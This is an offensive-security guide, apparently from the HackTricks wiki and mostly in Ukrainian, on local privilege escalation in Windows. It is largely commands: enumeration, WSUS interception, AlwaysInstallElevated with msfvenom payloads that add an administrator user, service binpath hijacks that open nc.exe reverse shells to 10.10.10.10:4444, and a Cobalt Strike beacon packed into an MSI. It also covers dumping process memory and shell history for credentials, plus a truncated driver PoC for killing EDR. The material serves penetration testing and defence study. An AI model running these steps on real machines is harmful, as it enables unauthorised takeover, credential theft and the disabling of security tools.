# Локальне підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Початкова теорія Windows

### Токени доступу (Access Tokens)

**Якщо ви не знаєте, що таке Windows Access Tokens, прочитайте наступну сторінку перед продовженням:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Перегляньте наступну сторінку для отримання додаткової інформації про ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності (Integrity Levels)

**Якщо ви не знаєте, що таке integrity levels у Windows, слід прочитати наступну сторінку перед продовженням:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Контролі безпеки Windows

У Windows існують різні механізми, які можуть **перешкодити вам у переліченні системи**, запуску виконуваних файлів або навіть **виявити вашу активність**. Ви повинні **прочитати** наступну **сторінку** і **перелічити** всі ці **захисні** **механізми** перед початком перебору для підвищення привілеїв:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Інформація про систему

### Перевірка інформації про версію

Перевірте, чи має версія Windows відому вразливість (також перевірте застосовані патчі).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Експлойти за версіями

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості безпеки Microsoft. У цій базі даних більше ніж 4 700 вразливостей безпеки, що демонструє **велику поверхню атаки**, яку представляє середовище Windows.

**На системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_

**Локально з інформацією про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії GitHub з експлойтами:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережені які-небудь облікові дані/чутлива інформація у змінних оточення?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell файли транскрипції

Дізнатися, як увімкнути це, можна за посиланням [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Фіксуються деталі виконань PowerShell pipeline, зокрема виконані команди, виклики команд і частини скриптів. Однак повні деталі виконання та результати виводу можуть не зберігатися.

Щоб увімкнути це, виконайте інструкції в розділі документації "Transcript files", обравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій у PowersShell logs, ви можете виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Зберігається повний запис активності та вмісту виконання скрипту, що гарантує документування кожного блоку коду під час його виконання. Цей процес зберігає всебічний журнал аудиту кожної дії, цінний для судової експертизи та аналізу шкідливої поведінки. Документуючи всю активність під час виконання, забезпечується детальне розуміння процесу.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Записи подій для Script Block можна знайти у Windows Event Viewer за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, ви можете використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Почніть з перевірки, чи використовує мережа оновлення WSUS без SSL, запустивши наступне в cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Або наступне в PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Якщо ви отримаєте відповідь, схожу на одну з наведених:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Тоді, **це експлуатується.** Якщо останнє значення реєстру дорівнює 0, запис WSUS буде ігнорований.

Щоб експлуатувати ці вразливості, можна використовувати інструменти, такі як: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
По суті, це вразливість, яку використовує цей баг:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Багато корпоративних агентів відкривають localhost IPC інтерфейс і привілейований канал оновлень. Якщо enrollment можна примусово направити на сервер атакуючого, а оновлювач довіряє підробленому root CA або має слабку перевірку підпису, локальний користувач може доставити шкідливий MSI, який встановить служба SYSTEM. Див. узагальнену техніку (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) тут:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Якщо у вас є сеанс meterpreter, ви можете автоматизувати цю техніку, використовуючи модуль **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарник Windows MSI для підвищення привілеїв. Цей скрипт записує попередньо скомпільований MSI-інсталятор, який запитує додавання користувача/групи (тому вам знадобиться GIU access):
```
Write-UserAddMSI
```
Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зауважте, що ви можете обгорнути файл "**.bat**", якщо ви **лише** хочете **виконати** **командні рядки**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Згенеруйте** за допомогою Cobalt Strike або Metasploit **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** та введіть "installer" у поле пошуку. Виберіть проект **Setup Wizard** і натисніть **Next**.
- Дайте проекту ім'я, наприклад **AlwaysPrivesc**, використайте **`C:\privesc`** як розташування, виберіть **place solution and project in the same directory**, і натисніть **Create**.
- Продовжуйте натискати **Next** до кроку 3 з 4 (choose files to include). Натисніть **Add** і виберіть Beacon payload, який ви щойно згенерували. Потім натисніть **Finish**.
- Виділіть проект **AlwaysPrivesc** у **Solution Explorer** і в **Properties** змініть **TargetPlatform** з **x86** на **x64**.
- Є й інші властивості, які можна змінити, наприклад **Author** та **Manufacturer**, що може зробити встановлений додаток більш правдоподібним.
- Клацніть правою кнопкою миші по проекту та оберіть **View > Custom Actions**.
- Клацніть правою кнопкою миші по **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить виконання beacon payload одразу після запуску інсталятора.
- У властивостях **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **build it**.
- Якщо з'являється попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу на x64.

### MSI Installation

Щоб виконати **інсталяцію** зловмисного файлу `.msi` у **фоновому режимі**:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Щоб експлуатувати цю вразливість ви можете використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та детектори

### Налаштування аудиту

Ці налаштування визначають, що **реєструється**, тож варто звернути на це увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — цікаво знати, куди надсилаються логи.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **управління паролями локального Administrator**, гарантує, що кожен пароль є **унікальним, випадковим і регулярно оновлюваним** на комп’ютерах, приєднаних до домену. Ці паролі надійно зберігаються в Active Directory і доступні лише користувачам, яким надано достатні дозволи через ACLs, що дозволяє їм переглядати local admin passwords, якщо вони уповноважені.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо увімкнено, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Починаючи з **Windows 8.1**, Microsoft впровадила посилений захист Local Security Authority (LSA), щоб **block** спроби ненадійних процесів **read its memory** або inject code, що додатково підвищує безпеку системи.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** був представлений у **Windows 10**. Його мета — захистити credentials, що зберігаються на пристрої, від загроз, таких як pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** автентифікуються **Local Security Authority** (LSA) та використовуються компонентами операційної системи. Коли дані logon користувача автентифікуються зареєстрованим security package, для користувача зазвичай встановлюються domain credentials.\
[**Більше інформації про Cached Credentials тут**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та групи

### Перерахування користувачів та груп

Вам слід перевірити, чи мають які-небудь групи, до яких ви належите, цікаві дозволи
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до якоїсь привілейованої групи, ви можете підвищити привілеї**. Дізнайтеся про привілейовані групи та як зловживати ними для ескалації привілеїв тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Дізнайтеся більше** про те, що таке **token** на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві tokens** та як їх зловживати:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, що увійшли / сесії
```bash
qwinsta
klist sessions
```
### Домашні папки
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримати вміст буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Права доступу до файлів і папок

По-перше, при переліку процесів перевіряйте наявність паролів у командному рядку процесу.\
Перевірте, чи можете перезаписати якийсь запущений binary або чи маєте права на запис у папці з binary-файлами, щоб експлуатувати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте можливу наявність [**electron/cef/chromium debuggers** які працюють — їх можна використати для підвищення привілеїв](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок, у яких розташовані бінарні файли процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Ви можете створити дамп пам'яті запущеного процесу за допомогою **procdump** від sysinternals. Сервіси на кшталт FTP зберігають **credentials in clear text in memory**; спробуйте зробити дамп пам'яті й прочитати credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI-додатки

**Додатки, що виконуються від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Служби

Service Triggers дозволяють Windows запускати службу, коли виникають певні умови (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Навіть без прав SERVICE_START ви часто можете запустити привілейовані служби, активувавши їх тригери. Див. техніки перерахування та активації тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

Отримайте список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використати **sc** для отримання інформації про службу
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** від _Sysinternals_ для перевірки необхідного рівня привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо ви отримуєте цю помилку (наприклад зі SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Ви можете увімкнути її за допомогою
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Майте на увазі, що служба upnphost залежить від SSDPSRV, щоб працювати (для XP SP1)**

**Інший обхідний шлях** цієї проблеми — запустити:
```
sc.exe config usosvc start= auto
```
### **Змінити шлях бінарного файлу служби**

У випадку, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** на службі, можливе змінення виконуваного бінарного файлу служби. Щоб змінити та виконати **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапустити службу
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Привілеї можна підвищити через різні дозволи:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштування бінарного файлу служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що в підсумку дає змогу змінювати конфігурації служб.
- **WRITE_OWNER**: Дозволяє отримати власність та змінювати дозволи.
- **GENERIC_WRITE**: Надає можливість змінювати конфігурації служб.
- **GENERIC_ALL**: Також надає можливість змінювати конфігурації служб.

Для виявлення та експлуатації цієї вразливості можна використовувати _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

**Перевірте, чи можете змінити бінарний файл, який виконує служба** або чи маєте ви **дозволи на запис у папку** де розташовано бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати всі бінарні файли, які виконує служба, за допомогою **wmic** (not in system32) і перевірити свої дозволи за допомогою **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ви також можете використовувати **sc** та **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Дозволи на модифікацію реєстру служб

Вам слід перевірити, чи можете ви змінювати будь-який реєстр служби.\
Ви можете **перевірити** свої **дозволи** щодо **реєстру** служби, виконавши:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Потрібно перевірити, чи **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** мають дозволи `FullControl`. У такому разі можна змінити бінарний файл, який виконується сервісом.

Щоб змінити шлях до бінарного файлу, що виконується:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

Якщо у вас є цей дозвіл над registry, це означає, що **ви можете створювати sub registries з цього реєстру**. У випадку Windows services це **достатньо, щоб execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожну частину шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Перелічіть усі нецитовані шляхи служб, за винятком тих, що належать вбудованим службам Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path`  
Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії відновлення

Windows дозволяє користувачам вказувати дії, які мають виконуватися у разі збою служби. Ця функція може бути налаштована так, щоб вказувати на бінарний файл. Якщо цей бінарний файл можна замінити, можливе підвищення привілеїв. Детальніше можна дізнатися в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Програми

### Встановлені програми

Перевірте **права доступу до бінарних файлів** (можливо, ви зможете перезаписати один із них і підвищити привілеї) та **папок** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Права на запис

Перевірте, чи можете ви змінити якийсь файл конфігурації, щоб прочитати певний спеціальний файл, або чи можете змінити бінарний файл, який буде виконано від імені облікового запису Administrator (schedtasks).

Один зі способів знайти слабкі дозволи на папки/файли в системі — виконати:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### При запуску

**Перевірте, чи можете ви перезаписати registry або binary, які будуть виконані іншим користувачем.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **сторонні підозрілі/вразливі** драйвери
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Сучасні вразливості Registry hive дозволяють підготувати детерміновані макети, зловживати записуваними нащадками HKLM/HKU та перетворювати корупцію метаданих у kernel paged-pool overflows без кастомного драйвера. Дізнайтесь повний ланцюжок тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Деякі підписані сторонні драйвери створюють свій device object із суворим SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапора secure DACL не застосовується, коли пристрій відкривається через шлях, що містить додатковий компонент, дозволяючи будь-якому непривілейованому користувачу отримати дескриптор, використовуючи namespace path на кшталт:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Як тільки користувач може відкрити пристрій, привілейовані IOCTLs, що їх надає драйвер, можуть бути зловживані для LPE та маніпуляцій. Приклади можливостей, помічених у реальному житті:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

